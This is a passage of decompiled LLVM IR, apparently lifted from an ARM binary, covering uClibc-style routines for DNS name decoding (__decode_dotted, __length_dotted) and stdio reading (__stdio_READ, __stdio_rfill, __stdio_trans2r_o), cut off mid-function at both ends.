  %v3_1a2a0 = xor i1 %v2_1a2a0, %v1_1a2a0
  %v4_1a2a0 = or i1 %v0_1a2a0, %v3_1a2a0
  br i1 %v4_1a2a0, label %.loopexit, label %bb18

bb18:                                             ; preds = %bb17
  %v7_1a2a0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v7_1a2a0, i32* @r4, align 4
  store i32 %v6_1a204, i32* @r5, align 4
  store i32 %v9_1a204, i32* @r6, align 4
  %v25_1a2a0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v25_1a2a0

.loopexit:                                        ; preds = %dec_label_pc_1a25c, %dec_label_pc_1a238, %bb17
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1a2a8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1a2a8, i32* @r4, align 4
  store i32 %v6_1a204, i32* @r5, align 4
  store i32 %v9_1a204, i32* @r6, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_1a290, { 0, 2, 1 }
  uselistorder i32 %v0_1a278.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1a270, { 1, 0 }
  uselistorder i32 %v2_1a25c, { 1, 0 }
  uselistorder i32 %v1_1a250, { 2, 0, 3, 1 }
  uselistorder i32 %v0_1a264, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_1a234, { 1, 0 }
  uselistorder i32 %v0_1a224, { 0, 2, 1, 3 }
  uselistorder i1 %v2_1a27820, { 1, 0 }
  uselistorder i32 %v9_1a204, { 1, 0 }
  uselistorder i32 %v6_1a204, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 7, 3, 8, 4, 6, 5, 1, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_v.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i32 (i8*)* @strlen, { 5, 24, 9, 4, 2, 12, 11, 10, 25, 23, 22, 21, 19, 20, 18, 17, 16, 15, 27, 26, 14, 13, 1, 3, 0, 8, 7, 6 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 4, 3, 2, 10, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 46, { 0, 6, 7, 1, 5, 2, 3, 4 }
  uselistorder label %.loopexit, { 2, 0, 1 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_1a290, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1a284, { 1, 0 }
  uselistorder label %dec_label_pc_1a238, { 1, 0 }
}

define i32 @__decode_dotted() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_1a2ac = load i32, i32* @r4, align 4
  %v6_1a2ac = load i32, i32* @r5, align 4
  %v0_1a2b0 = load i32, i32* @r0, align 4
  store i32 %v0_1a2b0, i32* %sl.global-to-local, align 4
  %v2_1a2b0 = icmp eq i32 %v0_1a2b0, 0
  br i1 %v2_1a2b0, label %.thread16, label %dec_label_pc_1a350.preheader

.thread16:                                        ; preds = %entry
  %v0_1a2bc1 = load i32, i32* @r2, align 4
  store i32 %v0_1a2bc1, i32* %sb.global-to-local, align 4
  %v0_1a2c02 = load i32, i32* @r3, align 4
  store i32 %v0_1a2c02, i32* %stack_var_-40, align 4
  br label %dec_label_pc_1a370

dec_label_pc_1a350.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_1a2bc = load i32, i32* @r2, align 4
  store i32 %v0_1a2bc, i32* %sb.global-to-local, align 4
  %v0_1a2c0 = load i32, i32* @r3, align 4
  store i32 %v0_1a2c0, i32* %stack_var_-40, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v1_1a3503952 = load i32, i32* @r1, align 4
  %v2_1a3504053 = add i32 %v1_1a3503952, %v0_1a2b0
  %v3_1a3504154 = inttoptr i32 %v2_1a3504053 to i8*
  %v4_1a3504255 = load i8, i8* %v3_1a3504154, align 1
  %v6_1a3504356 = zext i8 %v4_1a3504255 to i32
  store i32 %v6_1a3504356, i32* @r4, align 4
  %v2_1a3544457 = icmp eq i8 %v4_1a3504255, 0
  br i1 %v2_1a3544457, label %bb35, label %dec_label_pc_1a2d4.lr.ph

dec_label_pc_1a2d4:                               ; preds = %dec_label_pc_1a2d4.lr.ph, %bb30
  %v2_1a35c50 = phi i1 [ %v2_1a35c4663, %dec_label_pc_1a2d4.lr.ph ], [ true, %bb30 ]
  %v6_1a35048 = phi i32 [ %v6_1a3504361, %dec_label_pc_1a2d4.lr.ph ], [ %v6_1a350, %bb30 ]
  %v1_1a35047 = phi i32 [ %v1_1a3503960, %dec_label_pc_1a2d4.lr.ph ], [ %v5_1a2fc, %bb30 ]
  %v1_1a2d8 = and i32 %v6_1a35048, 192
  br i1 %v2_1a35c50, label %bb28, label %bb

bb:                                               ; preds = %dec_label_pc_1a2d4
  %v1_1a2dc = load i32, i32* %r8.global-to-local, align 4
  %v2_1a2dc = add i32 %v1_1a2dc, 1
  store i32 %v2_1a2dc, i32* %r8.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_1a2d4, %bb
  %v2_1a2e0 = icmp eq i32 %v1_1a2d8, 192
  %v1_1a2e4 = add i32 %v1_1a35047, 1
  store i32 %v1_1a2e4, i32* @r5, align 4
  br i1 %v2_1a2e0, label %dec_label_pc_1a2ec, label %dec_label_pc_1a30c

dec_label_pc_1a2ec:                               ; preds = %bb28
  %v2_1a2ec = add i32 %v1_1a2e4, %v0_1a2ec.ph59
  %v3_1a2ec = inttoptr i32 %v2_1a2ec to i8*
  %v4_1a2ec = load i8, i8* %v3_1a2ec, align 1
  %v6_1a2ec = zext i8 %v4_1a2ec to i32
  %v1_1a2f4 = urem i32 %v6_1a35048, 64
  br i1 %v2_1a35c50, label %bb30, label %bb29

bb29:                                             ; preds = %dec_label_pc_1a2ec
  %v1_1a2f8 = load i32, i32* %r8.global-to-local, align 4
  %v2_1a2f8 = add i32 %v1_1a2f8, 1
  store i32 %v2_1a2f8, i32* %r8.global-to-local, align 4
  br label %bb30

bb30:                                             ; preds = %dec_label_pc_1a2ec, %bb29
  %v4_1a2fc = mul nuw nsw i32 %v1_1a2f4, 256
  %v5_1a2fc = or i32 %v6_1a2ec, %v4_1a2fc
  store i32 %v5_1a2fc, i32* %r1.global-to-local, align 4
  store i32 %storemerge17.ph58, i32* %r7.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_1a350 = add i32 %v5_1a2fc, %v0_1a2ec.ph59
  %v3_1a350 = inttoptr i32 %v2_1a350 to i8*
  %v4_1a350 = load i8, i8* %v3_1a350, align 1
  %v6_1a350 = zext i8 %v4_1a350 to i32
  store i32 %v6_1a350, i32* @r4, align 4
  %v2_1a354 = icmp eq i8 %v4_1a350, 0
  br i1 %v2_1a354, label %dec_label_pc_1a35c.bb36_crit_edge, label %dec_label_pc_1a2d4

dec_label_pc_1a30c:                               ; preds = %bb28
  %v2_1a30c = add i32 %v6_1a35048, %storemerge17.ph58
  store i32 %v2_1a30c, i32* %r6.global-to-local, align 4
  %v2_1a310 = load i32, i32* %stack_var_-40, align 4
  %v1_1a314 = add i32 %v2_1a30c, 1
  store i32 %v1_1a314, i32* %r7.global-to-local, align 4
  %v3_1a318 = icmp ult i32 %v1_1a314, %v2_1a310
  br i1 %v3_1a318, label %dec_label_pc_1a320, label %dec_label_pc_1a370

dec_label_pc_1a320:                               ; preds = %dec_label_pc_1a30c
  %v2_1a320 = add i32 %v1_1a2e4, %v0_1a2ec.ph59
  store i32 %v2_1a320, i32* @r1, align 4
  %v0_1a324 = load i32, i32* %sb.global-to-local, align 4
  %v2_1a324 = add i32 %v0_1a324, %storemerge17.ph58
  store i32 %v2_1a324, i32* @r0, align 4
  store i32 %v6_1a35048, i32* @r2, align 4
  %v0_1a32c = call i32 @memcpy()
  %v0_1a330 = load i32, i32* @r5, align 4
  %v1_1a330 = load i32, i32* @r4, align 4
  %v2_1a330 = add i32 %v1_1a330, %v0_1a330
  store i32 %v2_1a330, i32* %r1.global-to-local, align 4
  %v0_1a334 = load i32, i32* %sl.global-to-local, align 4
  %v2_1a334 = add i32 %v0_1a334, %v2_1a330
  %v3_1a334 = inttoptr i32 %v2_1a334 to i8*
  %v4_1a334 = load i8, i8* %v3_1a334, align 1
  %v0_1a338 = load i32, i32* %fp.global-to-local, align 4
  %v2_1a338 = icmp eq i32 %v0_1a338, 0
  br i1 %v2_1a338, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_1a320
  %v1_1a33c = load i32, i32* %r8.global-to-local, align 4
  %v3_1a33c = add i32 %v1_1a33c, %v1_1a330
  store i32 %v3_1a33c, i32* %r8.global-to-local, align 4
  br label %bb32

bb32:                                             ; preds = %dec_label_pc_1a320, %bb31
  %v2_1a340 = icmp eq i8 %v4_1a334, 0
  br i1 %v2_1a340, label %bb34, label %bb33

bb33:                                             ; preds = %bb32
  br label %bb34

bb34:                                             ; preds = %bb32, %bb33
  %v0_1a348.off0 = phi i8 [ 0, %bb32 ], [ 46, %bb33 ]
  %v2_1a348 = load i32, i32* %sb.global-to-local, align 4
  %v3_1a348 = load i32, i32* %r6.global-to-local, align 4
  %v4_1a348 = add i32 %v3_1a348, %v2_1a348
  %v5_1a348 = inttoptr i32 %v4_1a348 to i8*
  store i8 %v0_1a348.off0, i8* %v5_1a348, align 1
  %v0_1a34c.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1a350.pre.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_1a35c.pre.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_1a35039 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a35040 = add i32 %v1_1a35039, %v0_1a350.pre.pre
  %v3_1a35041 = inttoptr i32 %v2_1a35040 to i8*
  %v4_1a35042 = load i8, i8* %v3_1a35041, align 1
  %v6_1a35043 = zext i8 %v4_1a35042 to i32
  store i32 %v6_1a35043, i32* @r4, align 4
  %v2_1a35444 = icmp eq i8 %v4_1a35042, 0
  %v2_1a35c46 = icmp eq i32 %v0_1a35c.pre.pre, 0
  br i1 %v2_1a35444, label %dec_label_pc_1a35c, label %dec_label_pc_1a2d4.lr.ph

dec_label_pc_1a2d4.lr.ph:                         ; preds = %dec_label_pc_1a350.preheader, %bb34
  %v2_1a35c4663 = phi i1 [ %v2_1a35c46, %bb34 ], [ false, %dec_label_pc_1a350.preheader ]
  %v6_1a3504361 = phi i32 [ %v6_1a35043, %bb34 ], [ %v6_1a3504356, %dec_label_pc_1a350.preheader ]
  %v1_1a3503960 = phi i32 [ %v1_1a35039, %bb34 ], [ %v1_1a3503952, %dec_label_pc_1a350.preheader ]
  %v0_1a2ec.ph59 = phi i32 [ %v0_1a350.pre.pre, %bb34 ], [ %v0_1a2b0, %dec_label_pc_1a350.preheader ]
  %storemerge17.ph58 = phi i32 [ %v0_1a34c.pre, %bb34 ], [ 0, %dec_label_pc_1a350.preheader ]
  br label %dec_label_pc_1a2d4

dec_label_pc_1a35c:                               ; preds = %bb34
  br i1 %v2_1a35c46, label %dec_label_pc_1a35c.bb36_crit_edge, label %bb35

dec_label_pc_1a35c.bb36_crit_edge:                ; preds = %bb30, %dec_label_pc_1a35c
  %v0_1a364.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1a370

bb35:                                             ; preds = %dec_label_pc_1a350.preheader, %dec_label_pc_1a35c
  %v1_1a360 = load i32, i32* %r8.global-to-local, align 4
  %v2_1a360 = add i32 %v1_1a360, 1
  store i32 %v2_1a360, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1a370

dec_label_pc_1a370:                               ; preds = %dec_label_pc_1a30c, %bb35, %dec_label_pc_1a35c.bb36_crit_edge, %.thread16
  %storemerge = phi i32 [ -1, %.thread16 ], [ %v0_1a364.pre, %dec_label_pc_1a35c.bb36_crit_edge ], [ %v2_1a360, %bb35 ], [ -1, %dec_label_pc_1a30c ]
  store i32 %v3_1a2ac, i32* @r4, align 4
  store i32 %v6_1a2ac, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge17.ph58, { 2, 1, 0 }
  uselistorder i32 %v0_1a2ec.ph59, { 2, 0, 1 }
  uselistorder i32 %v6_1a350, { 1, 0 }
  uselistorder i32 %v5_1a2fc, { 0, 2, 1 }
  uselistorder i32 %v6_1a35048, { 2, 1, 0, 3 }
  uselistorder i1 %v2_1a35c50, { 1, 0 }
  uselistorder i32 %v0_1a2b0, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-40, { 1, 2, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 5, 4, 1, 6, 2, 7, 3, 8, 9 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0, 3 }
  uselistorder i8 46, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32 ()* @memcpy, { 9, 8, 10, 7, 6, 5, 4, 0, 15, 14, 2, 1, 3, 13, 12, 11, 18, 17, 16 }
  uselistorder label %dec_label_pc_1a370, { 1, 2, 0, 3 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %dec_label_pc_1a35c.bb36_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1a2d4.lr.ph, { 1, 0 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %bb32, { 1, 0 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %v0_1a37c = load i32, i32* @r0, align 4
  store i32 %v0_1a37c, i32* @lr, align 4
  %v2_1a37c = icmp eq i32 %v0_1a37c, 0
  br i1 %v2_1a37c, label %bb, label %dec_label_pc_1a394

bb:                                               ; preds = %entry
  ret i32 -1

dec_label_pc_1a38c:                               ; preds = %dec_label_pc_1a39c
  %v1_1a38c = add i32 %v1_1a3a4, 2
  br label %dec_label_pc_1a3bc

dec_label_pc_1a394:                               ; preds = %entry
  %v0_1a394 = load i32, i32* @r1, align 4
  br label %dec_label_pc_1a3a4

dec_label_pc_1a39c:                               ; preds = %dec_label_pc_1a3a4
  %v1_1a3b0 = and i32 %v6_1a3a4, 192
  %v2_1a3b4 = add i32 %v6_1a3a4, %v1_1a3a8
  %v2_1a39c = icmp eq i32 %v1_1a3b0, 192
  br i1 %v2_1a39c, label %dec_label_pc_1a38c, label %dec_label_pc_1a3a4

dec_label_pc_1a3a4:                               ; preds = %dec_label_pc_1a39c, %dec_label_pc_1a394
  %v1_1a3a4 = phi i32 [ %v2_1a3b4, %dec_label_pc_1a39c ], [ %v0_1a394, %dec_label_pc_1a394 ]
  %v2_1a3a4 = add i32 %v1_1a3a4, %v0_1a37c
  %v3_1a3a4 = inttoptr i32 %v2_1a3a4 to i8*
  %v4_1a3a4 = load i8, i8* %v3_1a3a4, align 1
  %v6_1a3a4 = zext i8 %v4_1a3a4 to i32
  %v1_1a3a8 = add i32 %v1_1a3a4, 1
  %v2_1a3ac = icmp eq i8 %v4_1a3a4, 0
  br i1 %v2_1a3ac, label %dec_label_pc_1a3bc, label %dec_label_pc_1a39c

dec_label_pc_1a3bc:                               ; preds = %dec_label_pc_1a3a4, %dec_label_pc_1a38c
  %v1_1a3bc = phi i32 [ %v1_1a38c, %dec_label_pc_1a38c ], [ %v1_1a3a8, %dec_label_pc_1a3a4 ]
  %v2_1a3bc = sub i32 %v1_1a3bc, %v0_1a394
  ret i32 %v2_1a3bc

; uselistorder directives
  uselistorder i32 %v6_1a3a4, { 1, 0 }
  uselistorder i32 %v1_1a3a4, { 2, 1, 0 }
  uselistorder i32 %v0_1a37c, { 0, 2, 1 }
  uselistorder i8 0, { 64, 16, 24, 25, 65, 15, 21, 66, 67, 46, 71, 69, 45, 70, 68, 44, 39, 8, 9, 72, 73, 77, 78, 23, 60, 61, 74, 75, 76, 14, 79, 40, 47, 81, 80, 48, 41, 82, 83, 84, 85, 86, 87, 22, 0, 1, 88, 10, 51, 92, 2, 90, 89, 49, 3, 91, 50, 4, 93, 94, 26, 5, 96, 95, 52, 97, 98, 99, 100, 42, 101, 103, 104, 102, 11, 12, 13, 105, 6, 106, 27, 107, 17, 108, 18, 62, 28, 29, 7, 109, 110, 111, 113, 114, 115, 116, 112, 43, 117, 118, 119, 120, 121, 19, 30, 31, 32, 33, 34, 122, 123, 35, 125, 124, 36, 126, 127, 37, 128, 53, 20, 129, 130, 131, 133, 54, 134, 135, 132, 136, 137, 138, 139, 141, 140, 142, 63, 143, 144, 145, 162, 163, 161, 159, 160, 157, 158, 155, 156, 153, 154, 151, 152, 147, 148, 149, 150, 146, 164, 165, 166, 167, 168, 169, 170, 171, 173, 172, 175, 174, 176, 55, 178, 177, 38, 179, 56, 180, 182, 183, 181, 57, 184, 185, 59, 186, 58, 187, 188, 189, 190, 191, 192 }
  uselistorder i32 192, { 0, 5, 1, 6, 2, 4, 3 }
}

define i32 @__stdio_READ(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1a3c4 = load i32, i32* @r4, align 4
  store i32 %v3_1a3c4, i32* %stack_var_-12, align 4
  %v3_1a3c8 = load i8, i8* %arg1, align 1
  %v4_1a3c8 = zext i8 %v3_1a3c8 to i32
  store i32 %v4_1a3c8, i32* %r3.global-to-local, align 4
  %v1_1a3cc = and i32 %v4_1a3c8, 4
  store i32 %v1_1a3cc, i32* %r5.global-to-local, align 4
  %v2_1a3cc = icmp eq i32 %v1_1a3cc, 0
  store i1 %v2_1a3cc, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v2_1a3cc, label %bb8, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_1a3c4, i32* @r4, align 4
  ret i32 0

bb8:                                              ; preds = %entry
  %v1_1a3dc = icmp slt i32 %arg2, 0
  %v2_1a3dc = icmp eq i32 %arg2, 0
  store i1 %v2_1a3dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_1a3dc, label %bb9, label %bb10

bb9:                                              ; preds = %bb8
  store i32 2147483647, i32* @r2, align 4
  br label %bb10

bb10:                                             ; preds = %bb8, %bb9
  %v1_1a3e4 = add i32 %tmp, 4
  %v2_1a3e4 = inttoptr i32 %v1_1a3e4 to i32*
  %v3_1a3e4 = load i32, i32* %v2_1a3e4, align 4
  store i32 %v3_1a3e4, i32* %r0.global-to-local, align 4
  %v1_1a3e8 = call i32 @__libc_read(i32 %v3_1a3e4)
  store i32 %v1_1a3e8, i32* %r0.global-to-local, align 4
  %v2_1a3ec = icmp eq i32 %v1_1a3e8, 0
  store i1 %v2_1a3ec, i1* %cpsr_z.global-to-local, align 1
  %tmp11 = icmp slt i32 %v1_1a3e8, 1
  br i1 %tmp11, label %bb13, label %bb12

bb12:                                             ; preds = %bb10
  %v7_1a3f0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v7_1a3f0, i32* @r4, align 4
  ret i32 %v1_1a3e8

bb13:                                             ; preds = %bb10
  %v0_1a3f4 = load i32, i32* @r4, align 4
  %v1_1a3f4 = inttoptr i32 %v0_1a3f4 to i32*
  %v2_1a3f4 = load i32, i32* %v1_1a3f4, align 4
  %v1_1a3f8 = or i32 %v2_1a3f4, 8
  store i32 %v1_1a3f8, i32* %r1.global-to-local, align 4
  %v1_1a3fc = or i32 %v2_1a3f4, 4
  store i32 %v1_1a3fc, i32* %r3.global-to-local, align 4
  %v3_1a400 = sdiv i32 %v2_1a3f4, 256
  store i32 %v3_1a400, i32* %ip.global-to-local, align 4
  br i1 %v2_1a3ec, label %.thread, label %bb14

bb14:                                             ; preds = %bb13
  %v1_1a408 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_1a408, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread:                                          ; preds = %bb13
  %v2_1a40c = trunc i32 %v3_1a400 to i8
  %v4_1a40c = add i32 %v0_1a3f4, 1
  %v5_1a40c = inttoptr i32 %v4_1a40c to i8*
  store i8 %v2_1a40c, i8* %v5_1a40c, align 1
  %v0_1a410.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a410.pr, label %.thread1, label %.thread2

.thread1:                                         ; preds = %.thread
  %v1_1a410 = load i32, i32* %r3.global-to-local, align 4
  %v2_1a410 = trunc i32 %v1_1a410 to i8
  %v3_1a410 = load i32, i32* @r4, align 4
  %v4_1a410 = inttoptr i32 %v3_1a410 to i8*
  store i8 %v2_1a410, i8* %v4_1a410, align 1
  %v0_1a414.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a414.pr.pr, label %.thread3, label %.thread2

.thread2:                                         ; preds = %bb14, %.thread, %.thread1
  %v1_1a414 = load i32, i32* %ip.global-to-local, align 4
  %v2_1a414 = trunc i32 %v1_1a414 to i8
  %v3_1a414 = load i32, i32* @r4, align 4
  %v4_1a414 = add i32 %v3_1a414, 1
  %v5_1a414 = inttoptr i32 %v4_1a414 to i8*
  store i8 %v2_1a414, i8* %v5_1a414, align 1
  %v0_1a418.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a418.pr, label %.thread3, label %bb15

bb15:                                             ; preds = %.thread2
  %v1_1a418 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a418 = trunc i32 %v1_1a418 to i8
  %v3_1a418 = load i32, i32* @r4, align 4
  %v4_1a418 = inttoptr i32 %v3_1a418 to i8*
  store i8 %v2_1a418, i8* %v4_1a418, align 1
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %.thread2, %bb15
  %v2_1a41c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1a41c, i32* @r4, align 4
  %v11_1a41c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_1a41c

; uselistorder directives
  uselistorder i32 %v3_1a400, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 1, 5, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 (i32)* @__libc_read, { 0, 2, 1 }
  uselistorder i32 2147483647, { 2, 3, 0, 1 }
  uselistorder label %.thread3, { 2, 1, 0 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1a420 = load i32, i32* @r4, align 4
  store i32 %v3_1a420, i32* %stack_var_-8, align 4
  %v1_1a424 = add i32 %arg1, 8
  %v1_1a428 = inttoptr i32 %v1_1a424 to i32*
  %v2_1a428 = load i32, i32* %v1_1a428, align 4
  store i32 %v2_1a428, i32* @r1, align 4
  %v3_1a428 = add i32 %arg1, 12
  %v4_1a428 = inttoptr i32 %v3_1a428 to i32*
  %v5_1a428 = load i32, i32* %v4_1a428, align 4
  %v2_1a42c = sub i32 %v5_1a428, %v2_1a428
  store i32 %v2_1a42c, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_1a434 = inttoptr i32 %arg1 to i8*
  %v4_1a434 = call i32 @__stdio_READ(i8* %v3_1a434, i32 %v2_1a428, i32 %v2_1a42c)
  %v0_1a438 = load i32, i32* @r4, align 4
  %v1_1a438 = add i32 %v0_1a438, 8
  %v2_1a438 = inttoptr i32 %v1_1a438 to i32*
  %v3_1a438 = load i32, i32* %v2_1a438, align 4
  store i32 %v3_1a438, i32* %r2.global-to-local, align 4
  %v2_1a43c = add i32 %v3_1a438, %v4_1a434
  %v2_1a440 = add i32 %v0_1a438, 20
  %v3_1a440 = inttoptr i32 %v2_1a440 to i32*
  store i32 %v2_1a43c, i32* %v3_1a440, align 4
  %v0_1a444 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a444 = load i32, i32* @r4, align 4
  %v2_1a444 = add i32 %v1_1a444, 16
  %v3_1a444 = inttoptr i32 %v2_1a444 to i32*
  store i32 %v0_1a444, i32* %v3_1a444, align 4
  %v2_1a448 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1a448, i32* @r4, align 4
  ret i32 %v4_1a434

; uselistorder directives
  uselistorder i32 %v4_1a434, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1a44c = load i32, i32* @r4, align 4
  store i32 %v3_1a44c, i32* %stack_var_-12, align 4
  %v0_1a450 = load i32, i32* @r0, align 4
  %v1_1a450 = inttoptr i32 %v0_1a450 to i8*
  %v2_1a450 = load i8, i8* %v1_1a450, align 1
  %v3_1a450 = zext i8 %v2_1a450 to i32
  store i32 %v3_1a450, i32* %r2.global-to-local, align 4
  %v1_1a454 = add i32 %v0_1a450, 1
  %v2_1a454 = inttoptr i32 %v1_1a454 to i8*
  %v3_1a454 = load i8, i8* %v2_1a454, align 1
  %v4_1a454 = zext i8 %v3_1a454 to i32
  store i32 %v4_1a454, i32* %r3.global-to-local, align 4
  %v4_1a458 = mul nuw nsw i32 %v4_1a454, 256
  %v5_1a458 = or i32 %v4_1a458, %v3_1a450
  store i32 %v5_1a458, i32* %r2.global-to-local, align 4
  %v1_1a45c = load i32, i32* @r1, align 4
  %v2_1a45c = and i32 %v1_1a45c, %v5_1a458
  %v4_1a45c = icmp eq i32 %v2_1a45c, 0
  store i32 %v0_1a450, i32* @r4, align 4
  br i1 %v4_1a45c, label %dec_label_pc_1a468, label %dec_label_pc_1a480

dec_label_pc_1a468:                               ; preds = %entry
  %v1_1a468 = and i32 %v5_1a458, 2176
  %v2_1a468 = icmp eq i32 %v1_1a468, 0
  br i1 %v2_1a468, label %dec_label_pc_1a470, label %dec_label_pc_1a494

dec_label_pc_1a470:                               ; preds = %dec_label_pc_1a468
  %v2_1a470 = or i32 %v1_1a45c, %v5_1a458
  store i32 %v2_1a470, i32* %r2.global-to-local, align 4
  %v3_1a474 = sdiv i32 %v2_1a470, 256
  store i32 %v3_1a474, i32* %r3.global-to-local, align 4
  %v1_1a478 = trunc i32 %v3_1a474 to i8
  store i8 %v1_1a478, i8* %v2_1a454, align 1
  %v0_1a47c = load i32, i32* %r2.global-to-local, align 4
  %v1_1a47c = trunc i32 %v0_1a47c to i8
  %v2_1a47c = load i32, i32* @r0, align 4
  %v3_1a47c = inttoptr i32 %v2_1a47c to i8*
  store i8 %v1_1a47c, i8* %v3_1a47c, align 1
  %v0_1a480.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1a480

dec_label_pc_1a480:                               ; preds = %entry, %dec_label_pc_1a470
  %v0_1a480 = phi i32 [ %v0_1a450, %entry ], [ %v0_1a480.pre, %dec_label_pc_1a470 ]
  %v1_1a480 = inttoptr i32 %v0_1a480 to i8*
  %v2_1a480 = load i8, i8* %v1_1a480, align 1
  %v3_1a480 = zext i8 %v2_1a480 to i32
  store i32 %v3_1a480, i32* %r2.global-to-local, align 4
  %v1_1a484 = add i32 %v0_1a480, 1
  %v2_1a484 = inttoptr i32 %v1_1a484 to i8*
  %v3_1a484 = load i8, i8* %v2_1a484, align 1
  %v4_1a484 = zext i8 %v3_1a484 to i32
  %v4_1a488 = mul nuw nsw i32 %v4_1a484, 256
  %v5_1a488 = or i32 %v4_1a488, %v3_1a480
  store i32 %v5_1a488, i32* %r3.global-to-local, align 4
  %v1_1a48c = and i32 %v3_1a480, 16
  store i32 %v1_1a48c, i32* %r5.global-to-local, align 4
  %v2_1a48c = icmp eq i32 %v1_1a48c, 0
  br i1 %v2_1a48c, label %dec_label_pc_1a4bc, label %dec_label_pc_1a494

dec_label_pc_1a494:                               ; preds = %dec_label_pc_1a468, %dec_label_pc_1a480
  %v0_1a494 = call i32 @__errno_location()
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_1a49c = inttoptr i32 %v0_1a494 to i32*
  store i32 9, i32* %v2_1a49c, align 4
  br label %dec_label_pc_1a4a0

dec_label_pc_1a4a0:                               ; preds = %dec_label_pc_1a4c4, %dec_label_pc_1a494
  %v0_1a4a0 = load i32, i32* @r4, align 4
  %v1_1a4a0 = inttoptr i32 %v0_1a4a0 to i32*
  %v2_1a4a0 = load i32, i32* %v1_1a4a0, align 4
  %v1_1a4a4 = or i32 %v2_1a4a0, 8
  store i32 %v1_1a4a4, i32* %r3.global-to-local, align 4
  %v3_1a4a8 = sdiv i32 %v2_1a4a0, 256
  store i32 %v3_1a4a8, i32* %r2.global-to-local, align 4
